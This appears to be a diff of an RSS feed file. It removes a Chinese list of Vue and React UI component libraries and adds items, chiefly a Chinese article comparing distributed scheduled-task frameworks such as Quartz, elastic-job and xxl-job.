-&lt;h3 id=&quot;Qsupp&quot;&gt;&lt;a name=&quot;toc-12&quot;/&gt;&lt;span class=&quot;ne-text&quot;&gt;AT-UI&lt;/span&gt;&lt;/h3&gt;
-&lt;p id=&quot;u7e9b64b4&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;AT-UI 是一款基于 Vue.js 2.0 的前端 UI 组件库，主要用于快速开发 PC 网站中后台产品。&lt;/span&gt;&lt;/p&gt;
-&lt;p id=&quot;u49437dd4&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;创作者：&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;ne-text&quot;&gt;凹凸实验室&lt;/span&gt;&lt;/p&gt;
-&lt;p id=&quot;u4bf2b234&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;文档地址：&lt;/span&gt;&lt;/strong&gt;&lt;a class=&quot;ne-link&quot; href=&quot;https://at-ui.github.io/at-ui/#/zh&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-href=&quot;https://at-ui.github.io/at-ui/#/zh&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;https://at-ui.github.io/at-ui/#/zh&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id=&quot;FKjII&quot;&gt;&lt;a name=&quot;toc-13&quot;/&gt;&lt;span class=&quot;ne-text&quot;&gt;Vuetify&lt;/span&gt;&lt;/h3&gt;
-&lt;p id=&quot;u3ad4a893&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;Vuetify is a no design skills required UI Framework with beautifully handcrafted Vue Components.&lt;/span&gt;&lt;/p&gt;
-&lt;p id=&quot;u1b6efddc&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;创作者：&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;ne-text&quot;&gt;开源社区&lt;/span&gt;&lt;/p&gt;
-&lt;p id=&quot;u47057cb5&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;文档地址：&lt;/span&gt;&lt;/strong&gt;&lt;a class=&quot;ne-link&quot; href=&quot;https://vuetifyjs.com/en/getting-started/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-href=&quot;https://vuetifyjs.com/en/getting-started/&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;https://vuetifyjs.com/en/getting-started/&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id=&quot;njgUG&quot;&gt;&lt;a name=&quot;toc-14&quot;/&gt;&lt;span class=&quot;ne-text&quot;&gt;Element&lt;/span&gt;&lt;/h3&gt;
-&lt;p id=&quot;u213fb718&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt; Element，一套为开发者、设计师和产品经理准备的基于 Vue 2.0 的桌面端组件库。&lt;/span&gt;&lt;/p&gt;
-&lt;p id=&quot;u0c3469b8&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;创作者：&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;ne-text&quot;&gt;饿了么团队&lt;/span&gt;&lt;/p&gt;
-&lt;p id=&quot;u7c1aec70&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;文档地址：&lt;/span&gt;&lt;/strong&gt;&lt;a class=&quot;ne-link&quot; href=&quot;https://element.eleme.cn/#/zh-CN&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-href=&quot;https://element.eleme.cn/#/zh-CN&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;https://element.eleme.cn/#/zh-CN&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id=&quot;SXgXe&quot;&gt;&lt;a name=&quot;toc-15&quot;/&gt;&lt;span class=&quot;ne-text&quot;&gt;Wave UI&lt;/span&gt;&lt;/h3&gt;
-&lt;p id=&quot;ue72424ee&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;A Vue.js UI framework with only the bright side. &lt;/span&gt;&lt;/p&gt;
-&lt;p id=&quot;u6ee88d39&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;创作者：&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;ne-text&quot;&gt;开源社区&lt;/span&gt;&lt;/p&gt;
-&lt;p id=&quot;u9cc66618&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;文档地址：&lt;/span&gt;&lt;/strong&gt;&lt;a class=&quot;ne-link&quot; href=&quot;https://antoniandre.github.io/wave-ui/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-href=&quot;https://antoniandre.github.io/wave-ui/&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;https://antoniandre.github.io/wave-ui/&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;h2 id=&quot;BfUVg&quot;&gt;&lt;a name=&quot;toc-16&quot;/&gt;&lt;span class=&quot;ne-text&quot;&gt;React&lt;/span&gt;&lt;/h2&gt;
-&lt;h3 id=&quot;DblGn&quot;&gt;&lt;a name=&quot;toc-17&quot;/&gt;&lt;span class=&quot;ne-text&quot;&gt;Ant Design of React&lt;/span&gt;&lt;/h3&gt;
-&lt;p id=&quot;u9e60ec56&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;antd 是基于 Ant Design 设计体系的 React UI 组件库，主要用于研发企业级中后台产品。&lt;/span&gt;&lt;/p&gt;
-&lt;p id=&quot;u1445bbee&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;创作者：&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;ne-text&quot;&gt;蚂蚁金服团队&lt;/span&gt;&lt;/p&gt;
-&lt;p id=&quot;u2113c282&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;文档地址：&lt;/span&gt;&lt;/strong&gt;&lt;a class=&quot;ne-link&quot; href=&quot;https://ant.design/docs/react/introduce-cn&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-href=&quot;https://ant.design/docs/react/introduce-cn&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;https://ant.design/docs/react/introduce-cn&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id=&quot;ZK6Yw&quot;&gt;&lt;a name=&quot;toc-18&quot;/&gt;&lt;span class=&quot;ne-text&quot;&gt;React Vant&lt;/span&gt;&lt;/h3&gt;
-&lt;p id=&quot;u61cf5d37&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;根据 Vant 开发的基于 React 开发的移动端组件库。&lt;/span&gt;&lt;/p&gt;
-&lt;p id=&quot;ud4fcdb32&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;创作者：&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;ne-text&quot;&gt;开源社区&lt;/span&gt;&lt;/p&gt;
-&lt;p id=&quot;u9cdc829d&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;文档地址：&lt;/span&gt;&lt;/strong&gt;&lt;a class=&quot;ne-link&quot; href=&quot;https://react-vant-gitee.3lang.dev/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-href=&quot;https://react-vant-gitee.3lang.dev/&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;https://react-vant-gitee.3lang.dev/&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id=&quot;LBgWW&quot;&gt;&lt;a name=&quot;toc-19&quot;/&gt;&lt;span class=&quot;ne-text&quot;&gt;Element React&lt;/span&gt;&lt;/h3&gt;
-&lt;p id=&quot;u97b6bae5&quot; class=&quot;ne-p&quot;&gt;&lt;a class=&quot;ne-link&quot; href=&quot;https://github.com/ElemeFE/element&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-href=&quot;https://github.com/ElemeFE/element&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;Element&lt;/span&gt;&lt;/a&gt;&lt;span class=&quot;ne-text&quot;&gt; was initially written in &lt;/span&gt;&lt;a class=&quot;ne-link&quot; href=&quot;https://vuejs.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-href=&quot;https://vuejs.org/&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;Vue&lt;/span&gt;&lt;/a&gt;&lt;span class=&quot;ne-text&quot;&gt;, which has many elegant UI components, but we also love &lt;/span&gt;&lt;a class=&quot;ne-link&quot; href=&quot;https://facebook.github.io/react/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-href=&quot;https://facebook.github.io/react/&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;React&lt;/span&gt;&lt;/a&gt;&lt;span class=&quot;ne-text&quot;&gt;, so we forked it for the React community.&lt;/span&gt;&lt;/p&gt;
-&lt;p id=&quot;u90aea7aa&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;创作者：&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;ne-text&quot;&gt;开源社区&lt;/span&gt;&lt;/p&gt;
-&lt;p id=&quot;u6ed179a6&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;文档地址：&lt;/span&gt;&lt;/strong&gt;&lt;a class=&quot;ne-link&quot; href=&quot;https://elemefe.github.io/element-react/index&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-href=&quot;https://elemefe.github.io/element-react/index&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;https://elemefe.github.io/element-react/index&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
+<guid>d4806c47f947409bf1fdb92542466235</guid>
+<title>分布式定时任务框架选型，写的太好了 ！</title>
+<link>https://toutiao.io/k/uqhrn50</link>
+<content:encoded>&lt;div&gt;&lt;div&gt;&lt;section data-tool=&quot;mdnice编辑器&quot; data-website=&quot;https://www.mdnice.com&quot;&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;1.前言&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;2.定时任务框架&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;3.分布式任务调度系统对比&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;4.和quartz框架对比&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;5.综合对比&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;6.总结和结论&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;7.附定时任务的其他方案&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;hr data-tool=&quot;mdnice编辑器&quot;/&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;&lt;strong&gt;1. 前言&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;我们先思考下面几个业务场景的解决方案:&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;支付系统每天凌晨1点跑批，进行一天清算，每月1号进行上个月清算&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;电商整点抢购，商品价格8点整开始优惠&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;12306购票系统，超过30分钟没有成功支付订单的，进行回收处理&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;商品成功发货后，需要向客户发送短信提醒&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;p&gt;“&lt;/p&gt;&lt;p&gt;类似的业务场景非常多，我们怎么解决？&lt;/p&gt;&lt;p&gt;”&lt;/p&gt;&lt;span/&gt;&lt;/blockquote&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;很多业务场景需要我们某一特定的时刻去做某件任务，定时任务解决的就是这种业务场景。一般来说，系统可以使用消息传递代替部分定时任务，两者有很多相似之处，可以相互替换场景。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;如，上面发货成功发短信通知客户的业务场景，我们可以在发货成功后发送MQ消息到队列，然后去消费mq消息，发送短信。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;但在某些场景下不能互换：&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;时间驱动/事件驱动：内部系统一般可以通过时间来驱动，但涉及到外部系统，则只能使用时间驱动。如怕取外部网站价格，每小时爬一次&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;批量处理/逐条处理：批量处理堆积的数据更加高效，在不需要实时性的情况下比消息中间件更有优势。而且有的业务逻辑只能批量处理。如移动每个月结算我们的话费&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;实时性/非实时性：消息中间件能够做到实时处理数据，但是有些情况下并不需要实时，比如：vip升级&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;系统内部/系统解耦：定时任务调度一般是在系统内部，而消息中间件可用于两个系统间&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;&lt;strong&gt;2. 定时任务框架&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;单机&lt;/strong&gt;&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;strong&gt;timer&lt;/strong&gt; ：是一个定时器类，通过该类可以为指定的定时任务进行配置。TimerTask类是一个定时任务类，该类实现了Runnable接口，缺点异常未检查会中止线程&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;strong&gt;ScheduledExecutorService&lt;/strong&gt; ：相对延迟或者周期作为定时任务调度，缺点没有绝对的日期或者时间&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;strong&gt;spring定时框架&lt;/strong&gt; ：配置简单功能较多，如果系统使用单机的话可以优先考虑spring定时器&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;分布式&lt;/strong&gt;&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;strong&gt;Quartz&lt;/strong&gt; ：Java事实上的定时任务标准。但Quartz关注点在于定时任务而非数据，并无一套根据数据处理而定制化的流程。虽然Quartz可以基于数据库实现作业的高可用，但缺少分布式并行调度的功能&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;strong&gt;TBSchedule&lt;/strong&gt; ：阿里早期开源的分布式任务调度系统。代码略陈旧，使用timer而非线程池执行任务调度。众所周知，timer在处理异常状况时是有缺陷的。而且TBSchedule作业类型较为单一，只能是获取/处理数据一种模式。还有就是文档缺失比较严重&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;strong&gt;elastic-job&lt;/strong&gt; ：当当开发的弹性分布式任务调度系统，功能丰富强大，采用zookeeper实现分布式协调，实现任务高可用以及分片，目前是版本2.15，并且可以支持云开发，这个我写了系列教程了，在码猿技术专栏公从号可以搜索阅读。&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;strong&gt;Saturn&lt;/strong&gt; ：是唯品会自主研发的分布式的定时任务的调度平台，基于当当的elastic-job 版本1开发，并且可以很好的部署到docker容器上。&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;strong&gt;xxl-job&lt;/strong&gt; ：是大众点评员工徐雪里于2015年发布的分布式任务调度平台，是一个轻量级分布式任务调度框架，其核心设计目标是开发迅速、学习简单、轻量级、易扩展。&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;&lt;strong&gt;3. 分布式任务调度系统对比&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;参与对比的可选系统方案：elastic——job （以下简称E-Job）与 xxx-job(以下简称X-Job)&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;项目背景及社区力量&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;X-Job：大众点评公司下员工许雪里、贡献者 3人; github有2470star、1015fork; QQ讨论群6个; 有登记在使用的超过40家公司; 文档齐全&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;E-Job：当当网开源，贡献者17人; github有2524star、1015fork; QQ讨论群１个、源码讨论群１个; 有登记在使用的超过50家公司; 文档齐全; 有明确的发展计划&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;支持集群部署&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;X-Job：集群部署唯一要求为：保证每个集群节点配置（db和登陆账号等）保持一致。调度中心通过db配置区分不同集群。&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;执行器支持集群部署，提升调度系统可用性，同时提升任务处理能力。集群部署唯一要求为：保证集群中每个执行器的配置项 xxl.job.admin.addresses/调度中心地址”保持一致，执行器根据该配置进行执行器自动注册等操作。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;E-Job：重写Quartz基于数据库的分布式功能，改用Zookeeper实现注册中心&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;作业注册中心：基于Zookeeper和其客户端Curator实现的全局作业注册控制中心。用于注册，控制和协调分布式作业执行。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;多节点部署时任务不能重复执行&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;X-Job：使用Quartz基于数据库的分布式功能&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;E-Job：将任务拆分为n个任务项后，各个服务器分别执行各自分配到的任务项。一旦有新的服务器加入集群，或现有服务器下线，elastic-job将在保留本次任务执行不变的情况下，下次任务开始前触发任务重分片。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;日志可追溯&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;X-Job：支持，有日志查询界面&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;E-Job：可通过事件订阅的方式处理调度过程的重要事件，用于查询、统计和监控。Elastic-Job目前提供了基于关系型数据库两种事件订阅方式记录事件。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;监控告警&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;X-Job：调度失败时，将会触发失败报警，如发送报警邮件。&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;任务调度失败时邮件通知的邮箱地址，支持配置多邮箱地址，配置多个邮箱地址时用逗号分隔&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;E-Job：通过事件订阅方式可自行实现&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;作业运行状态监控、监听作业服务器存活、监听近期数据处理成功、数据流类型作业（可通过监听近期数据处理成功数判断作业流量是否正常,如果小于作业正常处理的阀值，可选择报警。）、监听近期数据处理失败（可通过监听近期数据处理失败数判断作业处理结果，如果大于0，可选择报警。）&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;弹性扩容缩容&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;X-Job：使用Quartz基于数据库的分布式功能，服务器超出一定数量会给数据库造成一定的压力&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;E-Job：通过zk实现各服务的注册、控制及协调&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;支持并行调度&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;X-Job：调度系统多线程（默认10个线程）触发调度运行，确保调度精确执行，不被堵塞。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;E-Job：采用任务分片方式实现。将一个任务拆分为n个独立的任务项，由分布式的服务器并行执行各自分配到的分片项。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;高可用策略&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;X-Job：“调度中心”通过DB锁保证集群分布式调度的一致性, 一次任务调度只会触发一次执行；&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;E-Job：调度器的高可用是通过运行几个指向同一个ZooKeeper集群的Elastic-Job-Cloud-Scheduler实例来实现的。ZooKeeper用于在当前主Elastic-Job-Cloud-Scheduler实例失败的情况下执行领导者选举。通过至少两个调度器实例来构成集群，集群中只有一个调度器实例提供服务，其他实例处于”待命”状态。当该实例失败时，集群会选举剩余实例中的一个来继续提供服务。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;失败处理策略&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;X-Job：调度失败时的处理策略，策略包括：失败告警（默认）、失败重试；&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;E-Job：弹性扩容缩容在下次作业运行前重分片，但本次作业执行的过程中，下线的服务器所分配的作业将不会重新被分配。失效转移功能可以在本次作业运行中用空闲服务器抓取孤儿作业分片执行。同样失效转移功能也会牺牲部分性能。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;动态分片策略&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;X-Job：分片广播任务以执行器为维度进行分片，支持动态扩容执行器集群从而动态增加分片数量，协同进行业务处理；在进行大数据量业务操作时可显著提升任务处理能力和速度。&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;执行器集群部署时，任务路由策略选择”分片广播”情况下，一次任务调度将会广播触发对应集群中所有执行器执行一次任务，同时传递分片参数；可根据分片参数开发分片任务；&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;E-Job：支持多种分片策略，可自定义分片策略&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;默认包含三种分片策略：基于平均分配算法的分片策略、 作业名的哈希值奇偶数决定IP升降序算法的分片策略、根据作业名的哈希值对Job实例列表进行轮转的分片策略，支持自定义分片策略&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;elastic-job的分片是通过zookeeper来实现的。分片的分片由主节点分配，如下三种情况都会触发主节点上的分片算法执行：a、新的Job实例加入集群 b、现有的Job实例下线（如果下线的是leader节点，那么先选举然后触发分片算法的执行） c、主节点选举”&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;&lt;strong&gt;4. 和quartz框架对比&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;调用API的的方式操作任务，不人性化；&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;需要持久化业务QuartzJobBean到底层数据表中，系统侵入性相当严重。&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;调度逻辑和QuartzJobBean耦合在同一个项目中，这将导致一个问题，在调度任务数量逐渐增多，同时调度任务逻辑逐渐加重的情况加，此时调度系统的性能将大大受限于业务；&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;Quartz关注点在于定时任务而非数据，并无一套根据数据处理而定制化的流程。虽然Quartz可以基于数据库实现作业的高可用，但缺少分布式并行调度的功能。&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;&lt;strong&gt;5. 综合对比&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;&lt;p&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-galleryid=&quot;&quot; data-ratio=&quot;1.05712319339298&quot; data-s=&quot;300,640&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/knmrNHnmCLEPwJRAUeujG1lMc9wfEj9WfY6GZvahzichQ3XnvNzcs9W8YrgywuIwHdZK4MMdngze5XKshsWgNZw/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1453&quot;/&gt;&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;figcaption&gt;图片&lt;/figcaption&gt;&lt;/figure&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;&lt;strong&gt;6. 总结和结论&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;共同点：&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;E-Job和X-job都有广泛的用户基础和完整的技术文档，都能满足定时任务的基本功能需求。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;不同点：&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;X-Job 侧重的业务实现的简单和管理的方便，学习成本简单，失败策略和路由策略丰富。推荐使用在“用户基数相对少，服务器数量在一定范围内”的情景下使用。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;E-Job 关注的是数据，增加了弹性扩容和数据分片的思路，以便于更大限度的利用分布式服务器的资源。但是学习成本相对高些，推荐在“数据量庞大，且部署服务器数量较多”时使用。&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;&lt;strong&gt;7. 附定时任务的其他方案&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;发货后超过10天未收货时系统自动确认收货的多种实现方式：&lt;/strong&gt;&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;每天定时半夜筛选第二天 可以自动确认收货的订单,然后第二天 每10分钟 执行一次确认收货 开销不会太大吧 时间也相对精确&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;自动确认收货这个状态如果仅仅是让客户端看的话，等用户下一次上线的时间，做一次运算就可以了。&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;延迟和定时消息投递&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;ActiveMQ提供了一种broker端消息定时调度机制。适用于：1、不希望消息马上被broker投递出去，而是想要消息60秒以后发给消费者，2、想让消息没隔一定时间投递一次，一共投递指定的次数&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;RabbitMQ可以针对Queue和Message设置 x-message-tt，来控制消息的生存时间，如果超时，则消息变为dead letter。利用DLX，当消息在一个队列中变成死信后，它能被重新publish到另一个Exchange。这时候消息就可以重新被消费。&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;好了，今天就分享到这里。希望对你有所帮助！&lt;span/&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;转载自：https://blog.csdn.net/Moonxiyue/article/details/125147094&lt;/span&gt;&lt;span/&gt;&lt;/p&gt;&lt;/section&gt;&lt;/div&gt;&lt;/div&gt;</content:encoded>
+</item>
+<item>
+<guid>cac1419b70cb87fee0d22a9132ee7c31</guid>
+<title>从实现到原理，聊聊 Java 中的 SPI 动态扩展</title>
+<link>https://toutiao.io/k/x9omrl4</link>
